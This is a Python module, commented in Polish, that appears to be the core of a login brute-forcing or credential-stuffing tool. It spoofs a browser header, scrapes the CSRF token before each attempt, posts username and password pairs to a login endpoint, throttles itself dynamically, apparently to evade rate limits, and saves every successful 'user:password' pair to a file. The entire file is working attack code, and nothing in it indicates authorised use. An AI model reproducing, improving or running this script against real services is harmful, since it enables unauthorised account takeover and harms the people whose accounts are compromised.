import time
import requests
from bs4 import BeautifulSoup
from settings import LOGIN_PAGE, LOGIN_POST, SUCCESS_FILE
from utils.files_utils import save_to_file

def create_session():
    """Utworzenie i zwrócenie nowej sesji z nagłówkami."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest"
    })
    return session

def check_server(session):
    """Sprawdzenie, czy serwer jest dostępny."""
    try:
        r = session.get(LOGIN_PAGE, timeout=10)
        if r.status_code == 200:
            return True
        else:
            print(f"[!] Serwer zwrócił status: {r.status_code}")
            return False
    except requests.RequestException as e:
        print(f"[!] Błąd połączenia z serwerem: {e}")
        return False

def get_csrf_token(session):
    """Pobranie tokenu CSRF ze strony logowania."""
    try:
        r = session.get(LOGIN_PAGE)
        soup = BeautifulSoup(r.text, "html.parser")
        token_input = soup.find("input", {"name": "csrf_token"})
        if token_input:
            token = token_input.get("value")
            print(f"[DEBUG] CSRF token: {token}")  # opcjonalny debug
            return token
    except Exception as e:
        print(f"[!] Błąd pobierania CSRF tokenu: {e}")
    return None

def try_login(session, known_success, username, password):
    """Próba logowania z dynamicznym tokenem CSRF."""
    csrf_token = get_csrf_token(session)
    data = {"login": username, "password": password}
    if csrf_token:
        data["csrf_token"] = csrf_token

    try:
        start_time = time.time()
        response = session.post(LOGIN_POST, data=data)
        elapsed = time.time() - start_time

        # dynamiczne opóźnienie
        time.sleep(1 + elapsed * 0.5)

        json_resp = response.json()
        if json_resp.get("error") == False:
            print(f"[+] Sukces: {username}:{password}")
            combo = f"{username}:{password}"
            if combo not in known_success:
                save_to_file(SUCCESS_FILE, combo)
                known_success.add(combo)
            return True
        else:
            print(f"[-] Nieudane: {username}:{password}")
            return False
    except Exception as e:
        print(f"[!] Błąd w odpowiedzi: {e}")
        return False